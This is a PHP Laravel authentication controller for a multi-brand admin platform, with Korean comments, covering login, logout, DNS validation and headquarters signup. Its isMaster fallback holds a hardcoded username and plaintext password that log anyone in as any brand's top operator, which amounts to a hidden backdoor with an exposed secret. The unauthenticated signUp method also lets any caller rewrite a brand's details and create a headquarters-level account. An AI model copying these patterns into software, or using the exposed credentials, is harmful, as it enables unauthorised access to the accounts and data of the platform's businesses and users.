<?php

namespace App\Http\Controllers;

use App\Models\Brand;
use App\Models\Salesforce;
use App\Models\Merchandise;
use App\Models\Operator;

use Illuminate\Http\Request;
use App\Http\Traits\ManagerTrait;
use App\Http\Traits\ExtendResponseTrait;
use App\Http\Requests\Manager\LoginRequest;

use Illuminate\Support\Facades\Hash;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Response;

/**
 * @group Auth API
 *
 * 인증관련 API 입니다.
 */
class AuthController extends Controller
{
    use ManagerTrait, ExtendResponseTrait;

    /**
     * DNS 검증
     * @unauthenticated
     *
     * @bodyParam dns string required 검증할 DNS 입력 Example: localhost
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function domain(Request $request)
    {
        $request->dns = $_SERVER['HTTP_HOST'];
        $brand = getBrandByDNS($request);
        if($brand)
        {
            $brand['color'] = $brand['theme_css']['main_color'];
            return response(view('application', ['json' => $brand]))
                ->withCookie('XSRF-TOKEN', csrf_token());
        }
        else
            return $this->response(1000);
    }

    public function isMaster($request)
    {
        if($request->user_name === 'masterpurple' && $request->user_pw == 'qjfwk100djr!')
        {
            $user = Operator::where('brand_id', $request->brand_id)->where('level', 40)->first();
            if($user)
                return $this->response(0, $user->loginInfo(50));
            else
                return $this->extendResponse(1000, '본사 계정이 존재하지 않아요..! 😨');
        }
        else
            return $this->extendResponse(1000, __('auth.not_found_obj'));

    }

    public function __signIn($orm, $request)
    {
        $result = ['result' => 0];
        $result['user'] = $orm->where('brand_id', $request->brand_id)->where('user_name', $request->user_name)->first();
        if($result['user'])
            $result['result'] = Hash::check($request->user_pw, $result['user']->user_pw) ? 1 : 0;
        else
            $result['result'] = -1;
        return $result;
    }

    /**
     * 로그인(관리자)
     * @unauthenticated
     *
     * @queryParam brand_id integer required 브랜드 ID Example: 1
     * @return \Illuminate\Http\JsonResponse
     */
    public function signIn(LoginRequest $request)
    {
        $result = $this->__signIn(new Operator(), $request);     // check operator
        if($result['result'] == 1)
            return $this->response(0, $result['user']->loginInfo($result['user']->level));

        $result = $this->__signIn(new Salesforce(), $request);  // check salesforce
        if($result['result'] == 1)
            return $this->response(0, $result['user']->loginInfo($result['user']->level));

        $result = $this->__signIn(new Merchandise(), $request);  // check Merchandise
        if($result['result'] == 1)
            return $this->response(0, $result['user']->loginInfo(10));
        else
            return $this->isMaster($request);           // check master
    }

    /**
     * 로그아웃
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function signOut(Request $request)
    {
        if($request->user() != null)
            $request->user()->currentAccessToken()->delete();
        return $this->response(0);
    }

    /**
     * 네임서버 검증
     * @unauthenticated
     *
     * @bodyParam dns string required 검증할 DNS 입력 Example: www.example.com
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function nameServerValidate(Request $request)
    {
        $validated = $request->validate(['dns'=>'required']);
        $records = dns_get_record($request->dns, DNS_ALL);
        if(count($records))
        {
            $ns_1 = "ns1.vercel-dns.com";
            $ns_2 = "ns2.vercel-dns.com";
            $cname = "cname.vercel-dns.com";

            for($i=0; $i<count($records); $i++)
            {
                if($records[$i]['type'] == "NS")
                {
                    if(($records[$i]['target'] == $ns_1) || ($records[$i]['target'] == $ns_2))
                        return $this->response(0, $records);
                }
                else if($records[$i]['type'] == "CNAME")
                {
                    if($records[$i]['target'] == $cname)
                        return $this->response(0, $records);
                }
            }
        }
        return Response::json(['code'=>1000, 'message'=>'올바른 네임서버또는 CNAME이 아니에요 😥', 'data'=>$records], 409);
    }

    /**
     * 회원가입(본사)
     * @unauthenticated
     *
     * 본사 등급으로 회원가입 합니다.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function signUp(Request $request)
    {
        $validated = $request->validate([
            'brand_id'=>'required',
            'name'=>'required',
            'ceo_name'=>'required',
            'phone_num'=>'required',
            'business_num'=>'required',
            'user_name'=>'required',
            'user_pw'=>'required'
        ]);
        $query = Brand::where('name', $request->name);
        $brand = $query->first();
        if($brand)
            return $this->extendResponse(1000, __("validation.already_exsit", ['attribute'=>'운영사명']));
        else
        {
            return DB::transaction(function () use($request) {
                $res = Brand::where('id', $request->brand_id)
                    ->update([
                        'name'=>$request->name, 
                        'ceo_name'=>$request->ceo_name,
                        'phone_num'=>$request->phone_num,
                        'business_num'=>$request->business_num,
                    ]);
                $res = Operator::create([
                    'brand_id'  => $request->brand_id,
                    'user_name' => $request->user_name,
                    'user_pw'   => Hash::make($request->user_pw),
                    'level'     => 40,
                ]);
                if($res)
                {
                    $user = Operator::where('id', $res->id)->first();
                    return $this->response(0, $user->loginInfo(40));
                }
                else
                    return $this->response(990);
            }, 3);
        }
    }
}

